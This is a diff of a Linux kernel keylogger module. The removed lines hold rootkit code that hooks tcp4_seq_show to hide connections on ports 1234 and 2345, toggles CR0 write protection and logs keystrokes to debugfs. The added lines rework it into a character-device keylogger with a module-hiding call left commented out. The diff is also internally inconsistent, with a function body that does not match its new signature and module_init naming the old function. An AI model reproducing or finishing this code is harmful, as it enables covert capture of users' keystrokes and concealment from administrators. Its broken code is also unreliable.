@@ -28,11 +28,6 @@
 #include <linux/notifier.h>
 #include <linux/fs.h>
 #include <linux/uaccess.h>
-#include <linux/syscalls.h>
-#include <linux/kallsyms.h>
-#include <linux/namei.h>
-#include <linux/tcp.h>
-#include "ftrace_helper.h"
 
 #ifdef HIDE_MODULE
 #include <linux/list.h>
@@ -67,101 +62,8 @@ MODULE_PARM_DESC(codes, "log format (0:US keys (default), 1:hex keycodes, 2:dec 
 static struct dentry *file;
 static struct dentry *subdir;
 
-static ssize_t keys_read(struct file *filp,
-		char *buffer,
-		size_t len,
-		loff_t *offset);
-
-static int spy_cb(struct notifier_block *nblock,
-		unsigned long code,
-		void *_param);
-
-static unsigned long * __force_order;
-
-/* Function declaration for the original tcp4_seq_show() function that we
- * are going to hook.
- * */
-static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
-
-/* This is our hook function for tcp4_seq_show */
-static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
-{
-    struct inet_sock *is;
-    long ret;
-    unsigned short port_in = htons(1234);
-	unsigned short port_out = htons(2345);
-
-    if (v != SEQ_START_TOKEN) {
-		is = (struct inet_sock *)v;
-		if (port_in == is->inet_sport || port_in == is->inet_dport || port_out == is->inet_sport || port_out == is->inet_dport) {
-			printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
-				   ntohs(is->inet_sport), ntohs(is->inet_dport));
-			return 0;
-		}
-	}
-
-	ret = orig_tcp4_seq_show(seq, v);
-	return ret;
-}
-
-/* Definitions */
-
-/*
- * Keymap references:
- * https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
- * http://www.quadibloc.com/comp/scan.htm
- */
-static const char *us_keymap[][2] = {
-	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
-	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
-	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
-	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
-	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
-	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
-	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
-	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
-	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
-	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
-	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
-	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
-	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
-	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
-	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
-	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
-	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
-	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
-	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
-	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
-	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
-	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
-	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
-	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
-	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
-	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
-	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
-	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
-	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
-	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
-	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
-	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
-	{"_PAUSE_", "_PAUSE_"},                                         // 119
-};
-
-static size_t buf_pos;
-static char keys_buf[BUF_LEN];
-
-const struct file_operations keys_fops = {
-	.owner = THIS_MODULE,
-	.read = keys_read,
-};
-
-/**
- * keys_read - read function for @file_operations structure
- */
-static ssize_t keys_read(struct file *filp,
-			 char *buffer,
-			 size_t len,
-			 loff_t *offset)
+static int kl_notifier_call(struct notifier_block *nb, unsigned long action,
+			    void *data)
 {
 	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
 }
@@ -269,70 +171,33 @@ void hideme(void)
 }
 #endif
 
-inline void cr0_write(unsigned long cr0)
-{
-    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
-}
-
-static inline void protect_memory(void)
-{
-    unsigned long cr0 = read_cr0();
-    set_bit(16, &cr0);
-    cr0_write(cr0);
-}
-
-static inline void unprotect_memory(void)
-{
-    unsigned long cr0 = read_cr0();
-    clear_bit(16, &cr0);
-    cr0_write(cr0);
-}
-
-static struct ftrace_hook hooks[] = {
-	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
-};
-
-
-/**
- * spy_init - module entry point
- *
- * Creates required debugfs directory and files
- * Registers the keyboard structure @notifier_block
- *
- * Returns 0 on successful initialization, otherwise
- * the appropriate error code in case of any error
- */
-static int __init spy_init(void)
+static int __init kl_init(void)
 {
 	int ret;
-	if (codes < 0 || codes > 2)
-		return -EINVAL;
 
-	subdir = debugfs_create_dir("logdir", NULL);
-	if (IS_ERR(subdir))
-		return PTR_ERR(subdir);
-	if (!subdir)
-		return -ENOENT;
+	ret = register_chrdev(0, DEVICE_NAME, &fops);
+	if (ret < 0) {
+		printk(KERN_ERR
+		       "keylog: Unable to register character device\n");
+		return ret;
+	}
+	major = ret;
+	printk(KERN_INFO "keylog: Registered device major number %u\n", major);
 
-	file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
-	if (!file) {
-		debugfs_remove_recursive(subdir);
-		return -ENOENT;
+	ret = register_keyboard_notifier(&kl_notifier_block);
+	if (ret) {
+		printk(KERN_ERR
+		       "keylog: Unable to register keyboard notifier\n");
+		return -ret;
 	}
 
-	#ifdef HIDE_MODULE
-		/* Hide myself from lsmod and /proc/modules :) */
-		hideme();
-	#endif
-	/*
-	 * Add to the list of console keyboard event
-	 * notifiers so the callback spy_cb is called
-	 * when an event occurs.
-	 */
-	protect_memory();
-	ret = register_keyboard_notifier(&spy_blk);
-	fh_install_hooks(hooks, ARRAY_SIZE(hooks));
-	unprotect_memory();
+	memset(input_buf, 0, BUFLEN);
+
+#ifdef HIDE_MODULE
+	/* Hide myself from lsmod and /proc/modules :) */
+	// hideme();
+#endif
+
 	return 0;
 }
 
@@ -344,11 +209,8 @@ static int __init spy_init(void)
  */
 static void __exit spy_exit(void)
 {
-	protect_memory();
-	unregister_keyboard_notifier(&spy_blk);
-	debugfs_remove_recursive(subdir);
-	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
-	unprotect_memory();
+	unregister_chrdev(major, DEVICE_NAME);
+	unregister_keyboard_notifier(&kl_notifier_block);
 }
 
 module_init(spy_init);
